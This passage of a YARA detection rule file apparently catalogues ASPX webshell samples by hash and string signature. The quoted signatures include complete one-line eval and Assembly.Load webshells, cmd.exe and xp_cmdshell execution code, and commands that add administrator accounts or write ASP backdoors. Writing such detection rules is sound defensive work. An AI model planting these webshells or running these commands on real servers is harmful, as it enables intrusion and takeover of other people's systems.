        $x18 = "SqlConnection conn = new SqlConnection(\"server=.\" + kp + \";User ID=\" + kusqlname.Text + \";Password=\" + kusqlpass.Tex" fullword ascii
        $x19 = "File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.System);" fullword ascii
        $x20 = "string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image" ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 300KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule sig_7f7bd5ab5a608e68f7e14af926fc6505990effcc
{
    meta:
        description = "aspx - file 7f7bd5ab5a608e68f7e14af926fc6505990effcc.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "181feef51991b162bdff5d49bb7fd368d9ec2b535475b88bc197d70d73eef886"
    strings:
        $x1 = "<asp:TextBox id=\"xpath\" runat=\"server\" Width=\"300px\">c:\\windows\\system32\\cmd.exe</asp:TextBox>        " fullword ascii
        $s2 = "myProcessStartInfo.UseShellExecute = false            " fullword ascii
        $s3 = "<asp:TextBox id=\"xcmd\" runat=\"server\" Width=\"300px\" Text=\"/c net user\">/c net user</asp:TextBox>        " fullword ascii
        $s4 = "myProcessStartInfo.Arguments=xcmd.text            " fullword ascii
        $s5 = "myProcessStartInfo.RedirectStandardOutput = true            " fullword ascii
        $s6 = "<p><asp:Button id=\"Button\" onclick=\"runcmd\" runat=\"server\" Width=\"100px\" Text=\"Run\"></asp:Button>        " fullword ascii
        $s7 = "myProcess.StartInfo = myProcessStartInfo            " fullword ascii
        $s8 = "Dim myStreamReader As StreamReader = myProcess.StandardOutput            " fullword ascii
        $s9 = "Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            " fullword ascii
        $s10 = "myProcess.Start()            " fullword ascii
        $s11 = "myProcess.Close()            " fullword ascii
        $s12 = "Dim myProcess As New Process()            " fullword ascii
        $s13 = "<%@ import Namespace=\"system.IO\" %>" fullword ascii
        $s14 = "<p><asp:Label id=\"L_p\" runat=\"server\" width=\"80px\">Program</asp:Label>        " fullword ascii
        $s15 = "<p><asp:Label id=\"L_a\" runat=\"server\" width=\"80px\">Arguments</asp:Label>        " fullword ascii
        $s16 = "Sub RunCmd(Src As Object, E As EventArgs)            " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c97acc37c7715f9c667f420e4b0a37a7bf6d50a2
{
    meta:
        description = "aspx - file c97acc37c7715f9c667f420e4b0a37a7bf6d50a2.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e0761cc8a8ab19665f13275ee1ae52e113438738fe376915a471b23388b7dc0b"
    strings:
        $x1 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
        $x2 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\"  Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $x3 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
        $x4 = "cmd.CommandText = \"exec master..xp_cmdshell '\" + TextBoxSqlCon.Text + \"'\";" fullword ascii
        $s5 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
        $s6 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Documents\\'>Documents</a>&nbsp&nbsp</td>" fullword ascii
        $s7 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'>All Users</a>&nbsp&nbsp</td>" fullword ascii
        $s8 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\"  Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s9 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\'>PcAn" fullword ascii
        $s10 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
        $s11 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'>Config</a>&nbsp&nbsp</td>" fullword ascii
        $s12 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s13 = "mycon.ConnectionString = \"Persist Security Info = False;User id =\" + TextBoxSqlB.Text + \";pwd=\" + TextBoxSql" fullword ascii
        $s14 = "mycon.ConnectionString = \"Persist Security Info = False;User id =\" + TextBoxSqlB.Text + \";pwd=\" + TextBo" fullword ascii
        $s15 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
        $s16 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
        $s17 = "Response.Write(\"<a href='?page=index&src=\" + Server.MapPath(\".\") + \"\\\\'><font color='#009900'>Webshell" fullword ascii
        $s18 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'>Data</a>&nbsp&nbsp</td>" fullword ascii
        $s19 = "<asp:TextBox ID=\"TextBoxSqlCon\" runat=\"server\" Width=\"400px\" >net user char char /add &amp; net localgroup administrator" fullword ascii
        $s20 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'>Serv-u" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule aefc46c3394c2b2b1d11d9c3fe25b09afda491c5
{
    meta:
        description = "aspx - file aefc46c3394c2b2b1d11d9c3fe25b09afda491c5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a6ac9698bd3a8081d9ace0088e1e96502c9da5f18650af8c882dda6e18ae4b31"
    strings:
        $x1 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
        $x2 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $x3 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
        $x4 = "cmd.CommandText = \"exec master..xp_cmdshell '\" + TextBoxSqlCon.Text + \"'\";" fullword ascii
        $x5 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
        $s6 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
        $s7 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s8 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
        $s9 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s10 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'><font color=\"#009900\">Data</font></a> </td>" fullword ascii
        $s11 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
        $s12 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
        $s13 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
        $s14 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
        $s15 = "Response.Write(\"<a href='?page=index&src=\" + Server.MapPath(\".\") + \"\\\\'><font color='#009900'>Webshell" fullword ascii
        $s16 = "<td><asp:TextBox ID=\"pass\" runat=\"server\" TextMode=\"Password\" ForeColor = \"#009900\"></asp:TextBox></td>" fullword ascii
        $s17 = "<td><a href='?page=index&src=C:\\windows\\Temp\\'><font color=\"#009900\">Temp</font></a> </td>" fullword ascii
        $s18 = "<asp:Label ID=\"LbSqlA\" runat=\"server\" Text=\"Sql Host:\"></asp:Label>" fullword ascii
        $s19 = "gif89a<%@ Page Language=\"C#\" ContentType=\"text/html\" validateRequest=\"false\" aspcompat=\"true\"%>" fullword ascii
        $s20 = "ListBoxPro.Items.Add(allprocess.ProcessName);" fullword ascii
    condition:
        ( uint16(0) == 0x6967 and filesize < 80KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_4d53416398a89aef3a39f63338a7c1bf2d3fcda4
{
    meta:
        description = "aspx - file 4d53416398a89aef3a39f63338a7c1bf2d3fcda4.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "04ba2f5a7292b67ce3bef5ccec04b294411d4155189d025e9f8e2714a10ec0ce"
    strings:
        $s1 = "public string RootKeys=@\"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG\";" fullword ascii
        $s2 = "string subkey=Reg_Path.Substring(Reg_Path.IndexOf(\"\\\\\")+1,Reg_Path.Length-Reg_Path.IndexOf(\"\\\\\")-1);" fullword ascii
        $s3 = "else if (Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii
        $s4 = "<asp:Panel ID=\"RegPanel\" runat=\"server\" Width=\"767px\" EnableViewState=\"False\" Visible=\"False\">" fullword ascii
        $s5 = "public string GetRegValue(RegistryKey sk,string strValueName)" fullword ascii
        $s6 = "foreach (string strSubKey in sk.GetSubKeyNames())" fullword ascii
        $s7 = "ErrLabel.Text=\"<font color=\\\"red\\\"><b>Error: </b></font>\"+err;" fullword ascii
        $s8 = "RegList+=\"<tr><td width=40%><b>Name</b></td><td width=20%><b>Type</b></td><td width=40%><b>Value</b></td></tr>\";" fullword ascii
        $s9 = "<asp:TextBox ID=\"RegPath\" runat=\"server\" Width=\"700px\"></asp:TextBox>&nbsp;" fullword ascii
        $s10 = "<asp:Label ID=\"RegListLabel\" runat=\"server\" EnableViewState=\"False\"></asp:Label>" fullword ascii
        $s11 = "else if (Reg_Path.StartsWith(\"HKEY_CURRENT_USER\"))" fullword ascii
        $s12 = "else if (Reg_Path.StartsWith(\"HKEY_CURRENT_CONFIG\"))" fullword ascii
        $s13 = "ArrayList RootArr=new ArrayList(RootKeys.Split('|'));" fullword ascii
        $s14 = "<asp:Label ID=\"ErrLabel\" runat=\"server\" Text=\"\" Width=\"764px\"/><br />" fullword ascii
        $s15 = "foreach (string strValueName in sk.GetValueNames())" fullword ascii
        $s16 = "foreach (string RootKey in RootArr)" fullword ascii
        $s17 = "GetRegValue(sk,strValueName)+\"</td></tr>\";" fullword ascii
        $s18 = "buffer=sk.GetValue(strValueName,\"NULL\");" fullword ascii
        $s19 = "<asp:Button ID=\"PathButton\" runat=\"server\" Text=\"GO\" />" fullword ascii
        $s20 = "<%@ Page Language=\"C#\" Debug=\"true\" trace=\"false\" validateRequest=\"false\" %>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule c1a2d939a65adaca82de315021ca5cfc07b3b830
{
    meta:
        description = "aspx - file c1a2d939a65adaca82de315021ca5cfc07b3b830.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6f3261eaaabf369bd928d179641b73ffd768184dfd4e00124da462a3075d4239"
    strings:
        $s1 = "sqlDataReader = sqlCommand.ExecuteReader();" fullword ascii
        $s2 = "<tr><td>&nbsp;</td><td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" /></td><" fullword ascii
        $s3 = "<tr><td width=\"30\">Auth Key:</td><td><asp:TextBox ID=\"txtAuthKey\" runat=\"server\" Height=\"15px\" Width=\"100%\"></asp:Te" fullword ascii
        $s4 = "sqlCommand.CommandType = CommandType.Text;" fullword ascii
        $s5 = "<tr><td>Connection:</td><td><asp:TextBox ID=\"txtConnection\" runat=\"server\" Height=\"15px\" Width=\"100%\"></asp:TextBox>" fullword ascii
        $s6 = "protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
        $s7 = "sqlCommand = new SqlCommand(txtSql.Text, sqlConnection);" fullword ascii
        $s8 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
        $s9 = "<tr><td>SQL:</td><td><asp:TextBox ID=\"txtSql\" runat=\"server\" Height=\"258px\" Width=\"100%\"></asp:TextBox></td></tr>" fullword ascii
        $s10 = "<%@ Import namespace=\"System.Data.SqlClient\"%>" fullword ascii
        $s11 = "private const string AUTHKEY = \"woanware\";" fullword ascii
        $s12 = "<%@ Import namespace=\"System.Data\"%>" fullword ascii
        $s13 = "<tr><td>&nbsp;</td><td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" /></td></tr>" ascii
        $s14 = "<tr><td colspan=\"2\"><asp:Literal ID=\"Literal1\" runat=\"server\"></asp:Literal></td></tr>" fullword ascii
        $s15 = "sqlConnection.ConnectionString = txtConnection.Text;" fullword ascii
        $s16 = "SqlCommand sqlCommand = null;" fullword ascii
        $s17 = "output.Append(sqlDataReader[index].ToString());" fullword ascii
        $s18 = "output.Append(\"<table width=\\\"100%\\\" border=\\\"1\\\">\");" fullword ascii
        $s19 = "if (txtAuthKey.Text != AUTHKEY)" fullword ascii
        $s20 = "sqlConnection.Dispose();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 9KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7f51371c3ed3726f1437f01e3c9dec3c53ed01c5
{
    meta:
        description = "aspx - file 7f51371c3ed3726f1437f01e3c9dec3c53ed01c5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6a168885faf8f214d59547e2a049b65d603b9d2e2ebf00f561a3d0faa0977261"
    strings:
        $x1 = "int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> " ascii
        $x2 = "<asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
        $x3 = "int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> " ascii
        $x4 = "string select=\"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=if" ascii
        $x5 = "string newdomain=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $x6 = "string newdomain=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $s7 = "<asp:Button ID=\"Bin_SAexecButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SAexecButton_Click\" /><br />" fullword ascii
        $s8 = "<asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword ascii
        $s9 = "Bin_SQLconnTextBox.Text=@\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\wwwroot\\database.mdb\";" fullword ascii
        $s10 = "<asp:Button ID=\"Bin_ExecButton\" runat=\"server\" OnClick=\"Bin_ExecButton_Click\" Text=\"Exec\" />" fullword ascii
        $s11 = "Hackright(H)2013 NightRunner -> <a href=\"http://sinhvienit.net\" target=\"_blank\">Hacker H4</a></asp:Panel><asp:Panel ID=\"Bin" ascii
        $s12 = "Hackright(H)2013 NightRunner -> <a href=\"http://sinhvienit.net\" target=\"_blank\">Hacker H4</a></asp:Panel><asp:Panel ID=\"Bin" ascii
        $s13 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.exe</asp:Text" ascii
        $s14 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.exe</asp:Text" ascii
        $s15 = "<asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Hackright(H)2013 NightRunner -> <a href=\"http://sin" ascii
        $s16 = "<asp:Label ID=\"PassLabel\" runat=\"server\" Text=\"Password:\"></asp:Label>" fullword ascii
        $s17 = "File.SetAttributes(FileName, File.GetAttributes(FileName)| FileAttributes.System);" fullword ascii
        $s18 = "'odsole70.dll')\\\">Add sp_oacreate<option value=\\\"Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')\\\">Add xp_cmd" ascii
        $s19 = "<a href=javascript:Command('change','\"+formatpath(Server.MapPath(\".\"))+\"');>\"+Server.MapPath(\".\")+\"</a>\";" fullword ascii
        $s20 = "string setdomain=\"-SETDOMAIN\\r\\n-Domain=BIN|0.0.0.0|52521|-1|1|0\\r\\n-TZOEnable=0\\r\\n TZOKey=\\r\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_4efd010c6692111d4a5cc9eb0dd3dfedde907654
{
    meta:
        description = "aspx - file 4efd010c6692111d4a5cc9eb0dd3dfedde907654.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f09b8567e0aa79ab9b223019b3f67cf98fe7dd2ffcab881e1421adf6f9e4c5b0"
    strings:
        $x1 = "string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=" ascii
        $x2 = "<asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
        $x3 = "@s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=\\\"sp_make" ascii
        $x4 = "<strong>Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></strong>" fullword ascii
        $x5 = "<strong>Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></strong" fullword ascii
        $x6 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $x7 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.ex" fullword ascii
        $s8 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $s9 = "ClientScript.RegisterStartupScript(this.GetType(), \"\", \"document.write(\\\"\" + Encoding.ASCII.GetString(cc) + Request." fullword ascii
        $s10 = "iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToStrin" fullword ascii
        $s11 = "Bin_Filelist += \"<i><b><a href=javascript:Command('change','\" + parstr + \"');>|Parent Directory|</a></b></i>\";" fullword ascii
        $s12 = "tmpstr += \"<td><a href=javascript:Command('change','\" + foldername + \"')>\" + Bin_folder.Name + \"</a></td><td><b>" fullword ascii
        $s13 = "file += \"<a href=javascript:Command('change','\" + formatpath(drivers[i]) + \"');>\" + drivers[i] + \"</a>&nbsp;\";" fullword ascii
        $s14 = "<asp:Button ID=\"Bin_SAexecButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SAexecButton_Click\" /><br />" fullword ascii
        $s15 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
        $s16 = "<asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2008 Bin -> <a href=\"http://www." fullword ascii
        $s17 = "sk @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' \\\">SP_ma" ascii
        $s18 = "<asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword ascii
        $s19 = "<asp:Button ID=\"Bin_LogshellButton\" runat=\"server\" Text=\"Bak_LOG\" OnClick=\"Bin_LogshellButton_Click\" /><hr /></a" fullword ascii
        $s20 = "Bin_SQLconnTextBox.Text = @\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\wwwroot\\database.mdb\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_74713cb1c7718da3d21d6fd82b3b911c1412ab89
{
    meta:
        description = "aspx - file 74713cb1c7718da3d21d6fd82b3b911c1412ab89.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f8042563c4c08f718cedf9d84caef904c73f30b292ddb107d069fab32ca9b10a"
    strings:
        $s1 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_3987f218383ff169c2f8d124c913e8b774967af3
{
    meta:
        description = "aspx - file 3987f218383ff169c2f8d124c913e8b774967af3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9c427df3f18bca7519afe3e193dab637b38b12104d55092e97bdeb41202db5cd"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"maskshell\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x6854 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_aspx_re2
{
    meta:
        description = "aspx - file re2.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "28392a10237e6b9771b857a9d4f0b14128d65da28794ff912790acb0aeafa812"
    strings:
        $s1 = "return BitConverter.ToString(h.ComputeHash(new UTF8Encoding().GetBytes(s))).Replace(\"-\", \"\");" fullword ascii
        $s2 = "IPAddress[] addresses = Dns.GetHostByName(target).AddressList;" fullword ascii
        $s3 = "String target = Request.Headers.Get(\"X-TARGET\").ToUpper();" fullword ascii
        $s4 = "Response.AddHeader(\"X-ERROR\", \"DNS lookup failed\");" fullword ascii
        $s5 = "String cmd = Request.Headers.Get(\"X-CMD\").ToUpper();" fullword ascii
        $s6 = "System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);" fullword ascii
        $s7 = "String target = Request.Headers.Get(\"X-TARGET\");" fullword ascii
        $s8 = "IPAddress ip = IPAddress.Parse(target);" fullword ascii
        $s9 = "int port = int.Parse(Request.Headers.Get(\"X-PORT\"));" fullword ascii
        $s10 = "Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);" fullword ascii
        $s11 = "string key = Request.Headers.Get(\"X-KEY\");" fullword ascii
        $s12 = "Response.AddHeader(\"X-ERROR\", exKak.Message);" fullword ascii
        $s13 = "Response.AddHeader(\"X-STATUS\", \"FAIL\");" fullword ascii
        $s14 = "Response.AddHeader(\"X-ERROR\", ex.Message);" fullword ascii
        $s15 = "if (key == null || Sha1(key) != \"A8FF2FE5C3BEEAB55B7F6FEE40A436748EAC135D\") {" fullword ascii
        $s16 = "else if (cmd == \"FORWARD\")" fullword ascii
        $s17 = "Session.Add(\"socket\", sender);" fullword ascii
        $s18 = "<%@ Import Namespace=\"System.Security.Cryptography\" %>" fullword ascii
        $s19 = "Response.AddHeader(\"X-STATUS\", \"OK\");" fullword ascii
        $s20 = "if (Request.HttpMethod == \"POST\")" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_650d85a8230a9eec9c1ee80787e8a33eebb0b864
{
    meta:
        description = "aspx - file 650d85a8230a9eec9c1ee80787e8a33eebb0b864.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c466d396694556b3ed51841b79c39cf998aa5f28224fdd5936465bcc49d6ca06"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"cmd3306\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_95515beca959af1785da12ab160dd33f9ef5b107
{
    meta:
        description = "aspx - file 95515beca959af1785da12ab160dd33f9ef5b107.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c838fc3ac163db357e7b9c17dbafdad497037b03c81868a96642422a31c76a86"
    strings:
        $s1 = "WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y(\"add6bb58e139be10\"); // ]]></script>" fullword ascii
        $s2 = "<script type=\"text/javascript\" language=\"C#\">// <![CDATA[" fullword ascii
    condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c5c42cd16f0b74aef17bb2968c9e2e8965376961
{
    meta:
        description = "aspx - file c5c42cd16f0b74aef17bb2968c9e2e8965376961.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1f2430025ab44d20c9773e301b55d751bc4244f05f0b30ba6e3be4088ac605e5"
    strings:
        $s1 = "<%@Page Language=\"JAVASCRIPT\"%><%eval(Request.Item(0),\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_929951f74efa191a423f99825c50e2c42868a70d
{
    meta:
        description = "aspx - file 929951f74efa191a423f99825c50e2c42868a70d.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "52d8aeed17d53e28c636d581ac132eaca64e18decc8cd3eadfff2f596c0cbbbc"
    strings:
        $s1 = "<script runat=\"server\" language=\"JScript\"> " fullword ascii
        $s2 = "var a = q + \"ns\" + w; " fullword ascii
    condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_9ddbed1d4f7aaa0d01934d03038863c776d086ef
{
    meta:
        description = "aspx - file 9ddbed1d4f7aaa0d01934d03038863c776d086ef.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e766eb97479af53d5b9a8273b0ca1435fe6155ad67a28cedf61b5aedda4bcd9a"
    strings:
        $s1 = "ystem.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c3f5d5d52890fe72bd2fc4c08aaf538da73016d7
{
    meta:
        description = "aspx - file c3f5d5d52890fe72bd2fc4c08aaf538da73016d7.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d8f79f3f185fe10f8598b5d88fd55219d809856150fd693347b32d7df6ad6999"
    strings:
        $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"Bin_List_Exec\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"Bin_List_Select" ascii
        $x2 = "OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:" ascii
        $x3 = "ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create tabl" ascii
        $x4 = "Bin_ExecSql(\"EXEC master..xp_cmdshell 'echo \" + substrfrm + \" >> c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x5 = "ePath.Value + \"\\\" -T -f c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x6 = "\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $x7 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
        $x8 = "t:16px\" size=\"40\" value=\"c:\\windows\\system32\\sethc.exe\"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat=\"server\" " fullword ascii
        $x9 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_Sav" fullword ascii
        $x10 = "Bin_ExecSql(\"EXECUTE master..xp_cmdshell 'del c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
